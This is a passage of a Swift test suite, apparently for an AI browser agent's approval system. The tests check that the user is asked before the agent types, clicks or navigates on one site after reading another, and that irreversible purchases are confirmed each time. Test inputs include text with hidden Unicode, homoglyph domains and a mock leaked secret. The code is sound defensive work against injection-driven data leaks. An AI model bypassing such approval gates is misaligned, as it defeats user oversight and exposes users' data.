            for i in 0..<5 { frames.offer(slot: "real\(i)", nonce: "n", frame: i) }
            for i in 0..<500 { frames.offer(slot: "junk\(i)", nonce: "j\(i)", frame: -1) }
            #expect(frames.offers.count == FrameRegistry<Int>.maxOffers)
            let found = (0..<5).map { index in frames.frame(for: "real\(index)") }
            #expect(found == [0, 1, 2, 3, 4], "every frame that answered is still found")
            // Even when the room is all taken by frames the reads wait for, one more is left out and nothing that answered goes.
            var full = FrameRegistry<Int>()
            for i in 0..<FrameRegistry<Int>.maxOffers { full.expect(slot: "s\(i)", nonce: "n") }
            for i in 0..<FrameRegistry<Int>.maxOffers { full.offer(slot: "s\(i)", nonce: "n", frame: i) }
            full.offer(slot: "extra", nonce: "n", frame: -1)
            #expect(full.offers.count == FrameRegistry<Int>.maxOffers && full.offers.first?.frame == 0 && !full.offers.contains { $0.slot == "extra" })
        }

        @Test func aFrameOfThePageNavigatingLetsGoOfTheHandlesButKeepsWhatTheReadGreetedAndTheNumbersOfTheFrames() {
            var frames = FrameRegistry<String>()
            frames.expect(slot: "f1", nonce: "n1")
            frames.offer(slot: "f1", nonce: "n1", frame: "one")
            frames.frameNavigated()
            #expect(frames.offers.isEmpty && frames.known.isEmpty && frames.frame(for: "f1") == nil, "no handle is used for what may be another document now")
            #expect(frames.expected == ["f1": "n1"], "a read under way still knows what it greeted")
            frames.offer(slot: "f1", nonce: "n1", frame: "answered again")
            #expect(frames.frame(for: "f1") == "answered again", "a frame that didn't navigate is found again when greeted")
            var state = AgentState()
            state.frames.expect(slot: "f1", nonce: "n1")
            state.ranges = [(5...9, "f1")]
            state.frameNavigated()
            #expect(state.frames.expected == ["f1": "n1"] && state.ranges.count == 1 && state.ranges[0].slot == "f1", "the numbers of the other frames' elements are not dropped mid-read")
            state.reset()
            #expect(state.frames.expected.isEmpty && state.ranges.isEmpty)
        }

        @Test func aLookThatCouldNotRunIsAFrameGoneAndOneThatGotNoAnswerInTimeIsNotAnswer() {
            #expect(ToolCatalog.look(.text("{\"found\":true,\"origin\":\"https://a.example\"}")) == .answered(["found": true, "origin": "https://a.example"]))
            #expect(ToolCatalog.look(.text(ToolCatalog.didNotAnswer, error: true)) == .hung, "a frame that hangs may still hold the text")
            #expect(ToolCatalog.look(.text("Error: A JavaScript exception occurred", error: true)) == .gone)
            #expect(ToolCatalog.look(.text("Error: WKErrorDomain Code=4", error: true)) == .gone)
            #expect(ToolCatalog.look(.text("not json")) == .hung && ToolCatalog.look(.text("[1]")) == .hung)
        }

        @Test func aReadWaitingForItsTurnEndsWhenItsTaskIsCancelled() async {
            let gate = ReadGate()
            let first = Task { @MainActor in await gate.run { try? await Task.sleep(for: .seconds(2)); return 1 } }
            try? await Task.sleep(for: .milliseconds(100))
            let waiting = Task { @MainActor in await gate.run { 2 } }
            try? await Task.sleep(for: .milliseconds(100))
            waiting.cancel()
            let started = Date()
            #expect(await waiting.value == nil && Date().timeIntervalSince(started) < 1, "it gives up instead of waiting its turn again and again")
            #expect(await first.value == 1)
            #expect(await gate.run { 3 } == 3, "and the gate is free after")
        }

        @Test func whatIsKeptIsCappedAndOldOffersGo() {
            var frames = FrameRegistry<Int>()
            let start = Date()
            for i in 0..<(FrameRegistry<Int>.maxOffers + 30) { frames.offer(slot: "s\(i)", nonce: "n", frame: i, now: start) }
            #expect(frames.offers.count == FrameRegistry<Int>.maxOffers)
            #expect(frames.offers.first?.frame == 30, "the newest are kept")
            for i in 0..<(FrameRegistry<Int>.maxOffers + 30) { frames.expect(slot: "s\(i)", nonce: "n") }
            #expect(frames.expected.count == FrameRegistry<Int>.maxOffers)
            frames.offer(slot: "late", nonce: "n", frame: -1, now: start.addingTimeInterval(FrameRegistry<Int>.offerLife + 1))
            #expect(frames.offers.count == 1)
        }
    }
}

/// Runs `body` with approvals on and every question answered by `answer` (which the stand's `answer` can change); the stand
/// has what was asked. Only this test's own code sees the stand, so tests running side by side don't answer for each other.
@MainActor
func asking(_ answer: @escaping (Approvals.Prompt) -> Approvals.Choice, _ body: (Approvals.Stand) async throws -> Void) async rethrows {
    let before = Preferences.shared.aiApprovals
    Preferences.shared.aiApprovals = true
    defer { Preferences.shared.aiApprovals = before }
    let stand = Approvals.Stand(answer)
    try await Approvals.$stand.withValue(stand) { try await body(stand) }
}

extension SharedAgentState {
    @MainActor @Suite
    struct ApprovalTests {
        @Test func aLongNameKeepsItsBeginningAndItsEnd() {
            #expect(Approvals.abbreviated("Delete") == "Delete")
            let long = String(repeating: "word ", count: 40) + "Place my order"
            let shown = Approvals.abbreviated(long)
            #expect(shown.count <= 80 && shown.hasPrefix("word word") && shown.hasSuffix("Place my order"))
        }

        private func open(_ addresses: [String]) -> (Browser, [Tab]) {
            let browser = Browser()
            browser.focused()
            return (browser, addresses.map { browser.openTab(url: URL(string: $0), activate: false) })
        }

        @Test func usingAPageAfterAnotherSiteWasReadOffersOnceTheSiteForTheChatOrNo() async {
            let (browser, tabs) = open(["https://a.example/", "https://b.example/"])
            defer { browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            await asking({ _ in .once }) { stand in
                #expect(await Approvals.allowInteraction(.type("hi"), on: tabs[1], caller: panel), "nothing read yet")
                #expect(stand.asked.isEmpty)
                Approvals.noteRead(tabs[0], readHost: nil, caller: panel)
                #expect(await Approvals.allowInteraction(.type("hi"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 1 && stand.asked[0].choices == [.deny, .once, .site])
                #expect(stand.asked[0].detail.contains("hi") && stand.asked[0].detail.contains("a.example"))
                #expect(await Approvals.allowInteraction(.type("again"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 2, "once is once")
            }
            await asking({ _ in .deny }) { stand in
                #expect(!(await Approvals.allowInteraction(.type("hi"), on: tabs[1], caller: panel)))
                #expect(!(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: panel)))
                #expect(stand.asked.count == 2, "no is asked again")
            }
        }

        @Test func everyWayOfUsingAPageIsAskedAboutNotJustTyping() async {
            let (browser, tabs) = open(["https://a.example/", "https://b.example/"])
            defer { browser.windowClosed() }
            let caller = "mcp-ways"
            Approvals.forgetReads(caller: caller)
            defer { Approvals.forgetReads(caller: caller) }
            await asking({ _ in .once }) { stand in
                Approvals.noteRead(tabs[0], readHost: nil, caller: caller)
                let ways: [Approvals.Interaction] = [.type("x"), .choose("Green"), .act("Clicking “Sign in”"), .act("Pressing Enter"), .act("Pointing at “Menu”"), .act("Dragging “A” to “B”"), .act("Clicking at 3, 4")]
                for way in ways { #expect(await Approvals.allowInteraction(way, on: tabs[1], caller: caller)) }
                #expect(stand.asked.count == ways.count)
                #expect(stand.asked.allSatisfy { $0.message.contains("b.example") })
                #expect(stand.asked[2].detail.contains("Clicking “Sign in”") && stand.asked[2].detail.contains("a.example"))
                #expect(stand.asked[0].message != stand.asked[2].message && stand.asked[1].message != stand.asked[2].message)
            }
        }

        @Test func aSiteAllowedForTheChatIsNotAskedAgainUntilTheChatIsClearedOrAnotherSiteIsRead() async {
            let (browser, tabs) = open(["https://a.example/", "https://B.example/x", "https://c.example/", "https://d.example/"])
            defer { browser.windowClosed() }
            let chat = ChatStore()
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { chat.reset() }
            await asking({ _ in .site }) { stand in
                Approvals.noteRead(tabs[0], readHost: nil, caller: panel)
                #expect(await Approvals.allowInteraction(.type("one"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 1)
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: panel))
                #expect(await Approvals.allowInteraction(.choose("three"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 1, "the site is allowed for this chat, for every way of using it")
                #expect(await Approvals.allowInteraction(.act("Pressing Enter"), on: tabs[2], caller: panel))
                #expect(stand.asked.count == 2, "another site is asked about")
                // The allowance was given knowing a.example had been read. Reading c.example (or any other) takes it back.
                Approvals.noteRead(tabs[2], readHost: nil, caller: panel)
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 3, "a site read after the allowance was given is a reason to ask again")
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 3, "and the new answer covers it")
                // Reading a site already known changes nothing.
                Approvals.noteRead(tabs[0], readHost: nil, caller: panel)
                #expect(await Approvals.allowInteraction(.act("Hovering"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 3)
                // A new chat (⌘⇧E) starts over.
                chat.reset()
                #expect(await Approvals.allowInteraction(.type("six"), on: tabs[1], caller: panel), "nothing read in the new chat")
                Approvals.noteRead(tabs[0], readHost: nil, caller: panel)
                #expect(await Approvals.allowInteraction(.type("seven"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 4, "asked again: the allowance ended with the chat")
            }
        }

        @Test func theCommandLineIsAskedEachTimeWhileThePanelAndMCPClientsCanAllowASiteForTheirChat() async {
            let (browser, tabs) = open(["https://a.example/", "https://b.example/"])
            defer { browser.windowClosed() }
            for caller in ["mcp-77", "unverified-panel"] {
                Approvals.forgetReads(caller: caller)
                defer { Approvals.forgetReads(caller: caller) }
                await asking({ _ in .site }) { stand in
                    Approvals.noteRead(tabs[0], readHost: nil, caller: caller)
                    #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: caller))
                    #expect(stand.asked.last?.choices == [.deny, .once, .site], "\(caller)")
                    #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: caller))
                    #expect(stand.asked.count == 1, "\(caller) is not asked again on the site it allowed for its chat")
                }
            }
            // Every command of the command line is the one caller "cli": what one was allowed would reach the next, so it is asked each time.
            Approvals.forgetReads(caller: "cli")
            defer { Approvals.forgetReads(caller: "cli") }
            await asking({ _ in .site }) { stand in
                Approvals.noteRead(tabs[0], readHost: nil, caller: "cli")
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: "cli"))
                #expect(stand.asked.last?.choices == [.deny, .once])
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: "cli"))
                #expect(stand.asked.count == 2, "cli is asked each time")
            }
            // A page without an address has no site to allow.
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            let blank = browser.openTab(url: nil, activate: false)
            await asking({ _ in .once }) { stand in
                Approvals.noteRead(tabs[0], readHost: nil, caller: panel)
                #expect(await Approvals.allowInteraction(.type("hi"), on: blank, caller: panel))
                #expect(stand.asked.last?.choices == [.deny, .once])
            }
        }

        @Test func anMCPClientCanAllowASiteForItsOwnConnectionOnly() async {
            let (browser, tabs) = open(["https://a.example/", "https://b.example/", "https://c.example/"])
            defer { browser.windowClosed() }
            let client = "mcp-1-site", other = "mcp-2-site"
            for caller in [client, other] { Approvals.forgetReads(caller: caller) }
            defer { for caller in [client, other] { Approvals.forgetReads(caller: caller) } }
            await asking({ prompt in prompt.choices.contains(.site) ? .site : .once }) { stand in
                Approvals.noteRead(tabs[0], readHost: nil, caller: client)
                #expect(await Approvals.allowInteraction(.type("one"), on: tabs[1], caller: client))
                #expect(stand.asked.count == 1 && stand.asked[0].choices == [.deny, .once, .site], "the MCP client is offered the site")
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: client))
                #expect(stand.asked.count == 1, "the next use of the site with the same reads isn't asked")
                // Another client that read the same thing has been allowed nothing.
                Approvals.noteRead(tabs[0], readHost: nil, caller: other)
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: other))
                #expect(stand.asked.count == 2, "a different caller is asked")
                // Reading another site takes the allowance back.
                Approvals.noteRead(tabs[2], readHost: nil, caller: client)
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: client))
                #expect(stand.asked.count == 3, "reading another site asks again")
                // What can't be undone is asked every time, the site allowed or not.
                for _ in 0..<2 { #expect(await Approvals.allowAction(.high, "Pay", on: tabs[1], caller: client)) }
                #expect(stand.asked.count == 5 && stand.asked.suffix(2).allSatisfy { $0.choices == [.deny, .once] && $0.message.contains("undone") })
                // A consent that only the page's markup calls a cookie banner is asked every time, with no site to allow.
                for _ in 0..<2 { #expect(await Approvals.allowAction(.low, "Accept", on: tabs[1], caller: client, markupOnly: true)) }
                #expect(stand.asked.count == 7 && stand.asked.suffix(2).allSatisfy { $0.choices == [.deny, .once] })
                // A new chat of the client, or its being forgotten, ends what it allowed.
                Approvals.forgetReads(caller: client)
                Approvals.noteRead(tabs[0], readHost: nil, caller: client)
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: client))
                #expect(stand.asked.count == 8)
            }
        }

        @Test func aDocumentWithNoSiteIsAlwaysAskedAboutAndNeverAllowedForTheChat() async {
            let (browser, tabs) = open(["https://a.example/", "https://b.example/"])
            defer { browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            await asking({ _ in .site }) { stand in
                Approvals.noteRead(tabs[0], readHost: nil, caller: panel)
                // A sandboxed frame or a data: page says its origin is "null": even on a tab whose address is a site.
                for _ in 0..<2 { #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: panel, site: "")) }
                #expect(stand.asked.count == 2 && stand.asked.allSatisfy { $0.choices == [.deny, .once] })
                #expect(stand.asked[0].message.contains("b.example") == false)
            }
        }

        @Test func theSiteTheDocumentSaysItIsInIsTheOneJudgedNotTheOneTheTabIsOn() async {
            let (browser, tabs) = open(["https://a.example/"])
            defer { browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            await asking({ _ in .site }) { stand in
                Approvals.noteRead(tabs[0], readHost: nil, caller: panel)
                #expect(stand.asked.isEmpty)
                // The frame is of b.example (by what it says inside), while the tab is on a.example, which was read.
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[0], caller: panel, site: "b.example"))
                #expect(stand.asked.count == 1 && stand.asked[0].message.contains("b.example"))
                #expect(await Approvals.allowInteraction(.act("again"), on: tabs[0], caller: panel, site: "b.example"))
                #expect(stand.asked.count == 1, "b.example is allowed for the chat")
                // The frame moved to c.example: the allowance for b.example doesn't carry over.
                #expect(await Approvals.allowInteraction(.act("again"), on: tabs[0], caller: panel, site: "c.example"))
                #expect(stand.asked.count == 2 && stand.asked[1].message.contains("c.example"))
            }
        }

        @Test func aFrameWithNoSiteIsASiteOfItsOwnForWhatWasRead() async {
            let (browser, tabs) = open(["https://a.example/", "https://b.example/"])
            defer { browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            await asking({ _ in .once }) { stand in
                Approvals.noteRead(tabs[0], readHost: Approvals.unknownFrame, caller: panel)
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 1, "what a frame of an unknown site showed counts as read")
                #expect(!stand.asked[0].detail.contains(Approvals.unknownFrame), "and is not shown as a raw marker")
            }
        }

        @Test func anIrreversibleActionIsAskedEveryTimeEvenOnAnAllowedSite() async {
            let (browser, tabs) = open(["https://a.example/", "https://shop.example/cart"])
            defer { browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            await asking({ _ in .site }) { stand in
                Approvals.noteRead(tabs[0], readHost: nil, caller: panel)
                #expect(await Approvals.allowInteraction(.type("hi"), on: tabs[1], caller: panel))
                let typed = stand.asked.count
                for round in 1...3 {
                    #expect(await Approvals.allowAction(.high, "Buy now", on: tabs[1], caller: panel))
                    #expect(stand.asked.count == typed + round, "asked in round \(round)")
                }
                let last = stand.asked.last
                #expect(last?.choices == [.deny, .once], "no way to allow it for the chat")
                #expect(last?.detail.contains("“Buy now”") == true && last?.detail.hasPrefix("shop.example\n\n") == true, "the site on a line of its own, first")
            }
            await asking({ _ in .deny }) { stand in
                #expect(!(await Approvals.allowAction(.high, "Pay", on: tabs[1], caller: panel)))
                #expect(!(await Approvals.allowAction(.high, "Pay", on: tabs[1], caller: panel)))
                #expect(stand.asked.count == 2)
            }
        }

        @Test func whatAFrameOfAnotherSiteShowedCountsAsReadFromThatSite() async {
            let (browser, tabs) = open(["https://a.example/"])
            defer { browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            await asking({ _ in .once }) { stand in
                // read_page of a.example showed a frame of b.example: the read is recorded for the frame's site.
                Approvals.noteRead(tabs[0], readHost: "b.example", caller: panel)
                #expect(await Approvals.allowInteraction(.type("hi"), on: tabs[0], caller: panel), "typing into the top page after reading b.example")
                #expect(stand.asked.count == 1 && stand.asked[0].detail.contains("b.example"))
            }
        }

        @Test func withApprovalsOffOnlyTheIrreversibleQuestionIsAsked() async {
            let (browser, tabs) = open(["https://a.example/", "https://b.example/"])
            defer { browser.windowClosed() }
            let before = Preferences.shared.aiApprovals
            Preferences.shared.aiApprovals = false
            defer { Preferences.shared.aiApprovals = before }
            let stand = Approvals.Stand { _ in .deny }
            await Approvals.$stand.withValue(stand) {
                Approvals.noteRead(tabs[0], readHost: nil, caller: "test-off")
                #expect(await Approvals.allowInteraction(.type("hi"), on: tabs[1], caller: "test-off"))
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: "test-off"))
                #expect(stand.asked.isEmpty)
                #expect(!(await Approvals.allowAction(.high, "Buy", on: tabs[1], caller: "test-off")), "what can't be undone is asked about whatever the setting says")
            }
            #expect(stand.asked.count == 1 && stand.asked[0].detail.contains("Buy"))
            Approvals.forgetReads(caller: "test-off")
        }

        @Test func tabsAndAddressesAllowedBelongToTheCallerThatWasAsked() async {
            let (browser, tabs) = open(["https://a.example/", "https://b.example/"])
            defer { browser.windowClosed() }
            let url = URL(string: "https://elsewhere.example/page?x=1")!
            await asking({ _ in .once }) { stand in
                #expect(await Approvals.allowTab(tabs[1], caller: "mcp-1"))
                #expect(await Approvals.allowTab(tabs[1], caller: "mcp-1"))
                #expect(stand.asked.count == 1, "mcp-1 isn't asked again for the tab")
                #expect(await Approvals.allowTab(tabs[1], caller: "mcp-2"))
                #expect(stand.asked.count == 2, "what one caller was allowed doesn't carry over to another")
                #expect(await Approvals.allowNavigation(url, caller: "mcp-1"))
                #expect(await Approvals.allowNavigation(url, caller: "mcp-1"))
                #expect(stand.asked.count == 3)
                #expect(await Approvals.allowNavigation(url, caller: "mcp-2"))
                #expect(stand.asked.count == 4)
            }
        }

        @Test func typedTextIsShownWholeOrSaidToBeCutAndLineBreaksAreMadeVisible() async {
            let (browser, tabs) = open(["https://a.example/", "https://evil.example/"])
            defer { browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            await asking({ _ in .site }) { stand in
                Approvals.noteRead(tabs[0], readHost: nil, caller: panel)
                // A short text is shown as it is; the line breaks and look-alikes that could push the warning off are made visible.
                #expect(await Approvals.allowInteraction(.type("one\ntwo\n\n\n\n\n\n\n\nthree"), on: tabs[1], caller: panel))
                let detail = stand.asked[0].detail
                #expect(detail.contains("one⏎two⏎⏎") && detail.contains("⏎three"))
                #expect(detail.components(separatedBy: "\n").count == 7, "only the question's own lines: \(detail)")
                #expect(!detail.contains("more characters"))
                #expect(stand.asked[0].choices == [.deny, .once, .site])
                // A long text is said to be cut, with how much; it is asked about every time and can't be allowed for the chat.
                let long = String(repeating: "benign ", count: 100) + "SECRET-FROM-A"
                for round in 1...2 { #expect(await Approvals.allowInteraction(.type(long), on: tabs[1], caller: panel)); #expect(stand.asked.count == 1 + round) }
                let cut = stand.asked.last!
                #expect(cut.choices == [.deny, .once])
                #expect(cut.detail.contains("(\(long.count - 500) more characters are not shown)") && !cut.detail.contains("SECRET-FROM-A"))
                #expect(cut.detail.hasSuffix("Deny if content from there is mixed in.") && cut.detail.contains("Sites read earlier"), "the warning is still there")
                // After the short one was allowed for the chat, the cut one is still asked about; the short one is not.
                #expect(await Approvals.allowInteraction(.type("short"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 3)
                #expect(await Approvals.allowInteraction(.choose(long), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 4 && stand.asked[3].choices == [.deny, .once])
            }
        }

        @Test func invisibleAndLookAlikeCharactersAreMadeVisibleCountedByScalarsAndNeverAllowedForTheChat() async {
            func shown(_ text: String, limit: Int = 500) -> (text: String, cut: Int, altered: Bool) { Approvals.shown(text, limit: limit) }
            #expect(shown("plain text 한글 e\u{301}").altered == false && shown("plain text 한글 e\u{301}").text == "plain text 한글 e\u{301}")
            #expect(shown("a\nb\tc") == ("a⏎b⇥c", 0, false), "breaks are made visible and are what they seem")
            for scalar in [0x200B, 0x200C, 0x200D, 0x2060, 0xFEFF, 0x202E, 0x2066, 0x200F, 0x061C, 0xFE0F, 0xFE00, 0xE0100, 0xE0041, 0xE0001, 0x3164, 0x115F, 0x1160, 0xFFA0, 0x2800, 0x034F, 0x00AD, 0x0000, 0x0085, 0x2028] {
                let result = shown("pay\(Unicode.Scalar(scalar)!)now")
                #expect(result.text == "pay▯now" && result.altered && result.cut == 0, "U+\(String(scalar, radix: 16)) is made visible")
            }
            // Counted and cut by scalars, not by characters: one character of many marks is many scalars.
            let zalgo = "a" + String(repeating: "\u{301}", count: 600) + "b"
            let result = shown(zalgo, limit: 500)
            #expect(result.altered && result.cut == 0 && result.text.unicodeScalars.count == 6 && result.text.hasSuffix("b"), "a pile of marks is capped, and the cap is visible")
            let marks = shown("e" + String(repeating: "\u{301}", count: 10) + "x")
            #expect(marks.text.unicodeScalars.filter { $0 == "\u{301}" }.count == 3 && marks.text.contains("▯") && marks.altered && marks.text.hasSuffix("x"))
            #expect(shown("e\u{301}\u{302}\u{303}x").altered == false, "three marks are allowed")
            let flags = String(repeating: "🇰🇷", count: 300)
            let cut = shown(flags, limit: 500)
            #expect(flags.count == 300 && cut.text.unicodeScalars.count == 500 && cut.cut == 100 && !cut.altered, "counted in scalars: a flag is two")
            let rest = shown(String(repeating: "x", count: 600) + "\u{200B}", limit: 500)
            #expect(rest.cut == 101 && rest.text.count == 500)
            #expect(Approvals.abbreviated(String(repeating: "\u{301}", count: 400)).unicodeScalars.count <= 80)

            let (browser, tabs) = open(["https://a.example/", "https://evil.example/"])
            defer { browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            await asking({ _ in .site }) { stand in
                Approvals.noteRead(tabs[0], readHost: nil, caller: panel)
                #expect(await Approvals.allowInteraction(.type("one\u{202E}two"), on: tabs[1], caller: panel))
                #expect(stand.asked[0].detail.contains("one▯two") && stand.asked[0].choices == [.deny, .once], "no allowance for this chat for a text that was changed")
                #expect(await Approvals.allowInteraction(.type("one\u{3164}two"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 2, "and it is asked about each time")
                #expect(await Approvals.allowInteraction(.choose("fine"), on: tabs[1], caller: panel))
                #expect(stand.asked[2].choices == [.deny, .once, .site])
            }
            // An address carries a hidden character as an escape, which is plain to see.
            await asking({ _ in .once }) { stand in
                let sneaky = URL(string: "https://elsewhere.example/a%E2%80%AEb")!
                for _ in 1...2 { #expect(await Approvals.allowNavigation(sneaky, caller: "mcp-hidden")) }
                #expect(stand.asked.count == 1 && stand.asked[0].detail.contains("a%E2%80%AEb"), "an address shows what it hides as escapes, and is remembered")
            }
        }

        @Test func anAddressWhoseEndIsNotShownIsAskedAboutEachTime() async {
            let long = URL(string: "https://elsewhere.example/" + String(repeating: "a", count: 700) + "?secret=1")!
            let short = URL(string: "https://elsewhere.example/page?x=1")!
            await asking({ _ in .once }) { stand in
                for _ in 1...2 { #expect(await Approvals.allowNavigation(long, caller: "mcp-long")) }
                #expect(stand.asked.count == 2)
                #expect(stand.asked[0].detail.contains("more characters are not shown") && !stand.asked[0].detail.contains("secret=1"))
                for _ in 1...2 { #expect(await Approvals.allowNavigation(short, caller: "mcp-long")) }
                #expect(stand.asked.count == 3, "a short address is remembered, as before")
                #expect(!stand.asked[2].detail.contains("more characters"))
            }
        }

        @Test func sitesAreToldByTheirExactHostPortAndWhetherTheyAreEncrypted() {
            func site(_ address: String) -> String? { Approvals.site(of: URL(string: address)) }
            #expect(site("https://www.example.com/a") == "www.example.com" && site("https://checkout.shop.example.com:443/") == "checkout.shop.example.com")
            #expect(site("https://shop.example.co.uk/") == "shop.example.co.uk" && site("http://Example.COM:80/") == "http://example.com")
            #expect(site("https://www.example.com/") != site("https://shop.example.com/") && site("https://example.com/") != site("https://www.example.com/"), "no host stands for another")
            #expect(site("http://example.com/") != site("https://example.com/") && site("http://example.com:8080/") == "http://example.com:8080", "http and https are two sites")
            #expect(site("http://localhost:18401/") == "http://localhost:18401" && site("http://localhost:18402/") == "http://localhost:18402" && site("http://localhost/") == "http://localhost")
            #expect(site("http://127.0.0.1:18401/") == "http://127.0.0.1:18401" && site("http://[::1]:18401/") == "http://[::1]:18401" && site("http://[::1]/") == "http://[::1]")
            #expect(site("https://a.github.io/") == "a.github.io" && site("https://b.github.io/") != site("https://a.github.io/"), "people sharing a host are not one site")
            #expect(site("file:///Users/me/secret.html") == "file:" && site("data:text/html,hi") == "data:" && site("blob:https://a.com/u") == "blob:")
            #expect(site("about:blank") == nil && site("") == nil && Approvals.site(of: nil) == nil)
            #expect(Approvals.site(ofOrigin: "https://x.example:8443") == "x.example:8443" && Approvals.site(ofOrigin: "http://x.example") == "http://x.example")
            #expect(Approvals.site(ofOrigin: "null") == "" && Approvals.site(ofOrigin: "") == "")
            #expect(Approvals.hasSite("example.com") && Approvals.hasSite("http://example.com") && !Approvals.hasSite("") && !Approvals.hasSite("file:"))
        }

        @Test func anInternationalNameIsOneSiteInItsAsciiFormWhateverWayItIsWritten() {
            func site(_ address: String) -> String? { Approvals.site(of: URL(string: address)) }
            #expect(site("https://bücher.example/") == "xn--bcher-kva.example" && site("https://xn--bcher-kva.example/") == "xn--bcher-kva.example")
            #expect(Approvals.site(ofOrigin: "https://xn--bcher-kva.example") == site("https://bücher.example/x"))
            #expect(site("https://аррӏе.com/") == "xn--80ak6aa92e.com", "a look-alike of apple.com is shown as what it is")
            #expect(Approvals.hostname(ofSite: "xn--80ak6aa92e.com:8443") == "xn--80ak6aa92e.com" && Approvals.hostname(ofSite: "http://a.example") == "a.example")
            #expect(Approvals.hostname(ofSite: "[::1]:8080") == "::1" && Approvals.hostname(ofSite: "file:") == nil && Approvals.hostname(ofSite: Approvals.unknownFrame) == nil && Approvals.hostname(ofSite: "") == nil)
        }

        @Test func aNameThePageChoseCantEndTheQuotationItSitsIn() {
            #expect(Approvals.quotable("Pay” on bank.example — “Cancel") == "Pay' on bank.example — 'Cancel")
            #expect(Approvals.quotable("a\"b`c«d»e「f」") == "a'b'c'd'e'f'")
            #expect(Approvals.quotable("Plain name") == "Plain name")
        }

        @Test func anotherPortOfTheSameHostIsAnotherSite() async {
            let (browser, tabs) = open(["http://localhost:18401/", "http://localhost:18402/"])
            defer { browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            await asking({ _ in .site }) { stand in
                Approvals.noteRead(tabs[0], readHost: nil, caller: panel)
                #expect(stand.asked.isEmpty)
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 1 && stand.asked[0].message.contains("localhost:18402") && stand.asked[0].detail.contains("localhost:18401"))
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 1, "allowed for the chat")
                // What was read from the other port is a different site, which the allowance for this one does not cover.
                Approvals.noteRead(tabs[1], readHost: nil, caller: panel)
                #expect(await Approvals.allowInteraction(.act("Clicking “Go”"), on: tabs[0], caller: panel))
                #expect(stand.asked.count == 2)
            }
        }

        @Test func otherHostsOfOneDomainAreOtherSites() async {
            let (browser, tabs) = open(["https://alice.hosting.example/", "https://bob.hosting.example/", "https://www.shop.example/", "https://checkout.shop.example/pay"])
            defer { browser.windowClosed() }
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            await asking({ _ in .once }) { stand in
                Approvals.noteRead(tabs[0], caller: panel)
                #expect(await Approvals.allowInteraction(.type("x"), on: tabs[0], caller: panel))
                #expect(stand.asked.isEmpty, "the page that was read is free to use")
                #expect(await Approvals.allowInteraction(.type("x"), on: tabs[1], caller: panel))
                #expect(stand.asked.count == 1 && stand.asked[0].message.contains("bob.hosting.example") && stand.asked[0].detail.contains("alice.hosting.example"))
                Approvals.forgetReads(caller: panel)
                Approvals.noteRead(tabs[2], caller: panel)
                #expect(await Approvals.allowInteraction(.type("x"), on: tabs[3], caller: panel))
                #expect(stand.asked.count == 2, "www and checkout are two sites: what is read on one is another site's to the other")
            }
        }

        @Test func aPageWithNoHostCountsAsReadAndIsNotSilentlyFree() async {
            let (browser, tabs) = open(["https://evil.example/"])
            defer { browser.windowClosed() }
            let file = browser.openTab(url: URL(string: "file:///Users/me/secrets.html"), activate: false)
            let panel = ChatStore.caller
            Approvals.forgetReads(caller: panel)
            defer { Approvals.forgetReads(caller: panel) }
            await asking({ _ in .site }) { stand in
                Approvals.noteRead(file, caller: panel)
                Approvals.noteRead(tabs[0], caller: panel)
